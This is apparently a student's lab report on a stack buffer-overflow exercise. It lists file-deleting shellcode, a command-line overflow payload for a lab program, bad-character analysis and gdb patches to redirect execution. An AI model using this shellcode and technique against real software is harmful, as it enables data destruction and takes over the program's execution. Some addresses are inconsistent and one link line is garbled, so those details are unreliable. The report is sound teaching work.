Name: Dinh Thi Thanh Vy
ID: 22110093

# Lab 2: 
## Task 1: Inject code to delete file
---
Source code asm
![image-11](https://github.com/user-attachments/assets/6542abf7-92ca-4db8-abb4-c0fa96d2346f)

Run virtual environment by docker file

![image-12](https://github.com/user-attachments/assets/93a457dc-ea99-42a4-a008-6b429e4d92c8)

Run file asm and get the shellcode
![image-13](https://github.com/user-attachments/assets/586d0180-a220-4949-bac9-a254e4169f5f)
We have the shellcode for this program as follows:
\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00
We remove \xdummyfile because it is not meaningful hexadecimal code

**Stack Frame:**
![image-14](https://github.com/user-attachments/assets/ab087734-8263-4470-b7eb-d28d374b2291)

shell code: 36 bytes
Return address: 4 bytes
--> placement code: 32 bytes
Here, we will use the vuln.c program to trigger a buffer overflow

Connect to gdb
![image-15](https://github.com/user-attachments/assets/c6af93fd-7989-4d72-a685-554a8bf04265)
>b *0x0804846b

Run vuln.c
>r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'*32+'\xff\xff\xff\xff')")

![image-16](https://github.com/user-attachments/assets/b11541a0-0a3c-4132-95bb-2c2b82ffae3e)
We observe that the first 3 bytes still correspond to the shellcode, but starting from the 4th byte, which corresponds to the newline character 0x0a, the `strcpy` function terminates the string, causing the interruption.  

Observing the ASCII table, we need to avoid the following characters: 
- 0x00 because it marks the end of a string. 
- 0x09 because it's the tab character and would split the argument. 
- 0x0a because it's the newline character and would also terminate the string.

Additionally, 0x0a has a decimal value of 10, and upon reviewing the assembly code, we find:
![image-17](https://github.com/user-attachments/assets/458cf216-ab75-479b-8ec3-7f14d8f00c44)

change file asm:
![image-20](https://github.com/user-attachments/assets/e4535e67-6c6a-433a-a759-f85231728386)

Get shellcode again
>\xeb\x14\x31\xc0\xb0\x08\x04\x02\xbb\x7b\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe7\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00\
![image-19](https://github.com/user-attachments/assets/90b87d2b-4d46-4a69-a807-6036db39ed97)

For now, we will set the bytes of the address to 0xff. The last used byte of the shellcode will be 0x0f to 
prevent string termination and to identify the position of the return frame.

>r $(python -c "print('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x0f'+'a'*32+'\xff\xff\xff\xff')")

![image-22](https://github.com/user-attachments/assets/3a81fd45-f7b6-4181-9db9-76132483ce39)

At this point, the program will likely report an error because it cannot find the address 0xffffffff. 

We need to set 0x0c to 0x00 at the address 0xffffd66b by using command: 
>set {unsigned char} 0xffffd66b = 0x00

we will replace the values of 0xffffffff with the address of the buffer, which is ffffd658, in the form of \x58\xd6\xff\xff. 
>set *0xffffd69c = 0xffffd658

The command will be: 
![image-23](https://github.com/user-attachments/assets/f4d54f17-a676-4c3e-b0d1-bbed81f2916d)

Continue runing the program to test out

![image-24](https://github.com/user-attachments/assets/6911c5f2-9d4a-40f8-b2a8-451963d15611)
Dummyfile is still here. Look at the assembly code!
>objdump -d file_del

![image-25](https://github.com/user-attachments/assets/b57dad16-6a7f-4799-afd5-e0d1d8839ce4)

As we can see, the dummyfile is start from 0xffffd672 not from 0x080407a in C program!
We need to set 0xffffd651 to point at that using command: set *0xffffd661 = 0xffffd672
![image-26](https://github.com/user-attachments/assets/92f7c43a-f56b-4188-b77c-85a3b42b1907)
ets/83b8577a-e3d5-44fa-aabe-0d191f149020)
contnue running the program 
![image-27](https://github.com/user-attachments/assets/2d18d141-f215-49f9-83b5-5aaa2fcd1890)

-->dummyfile is deleted


## Task 2: Conduct attack on ctf.c

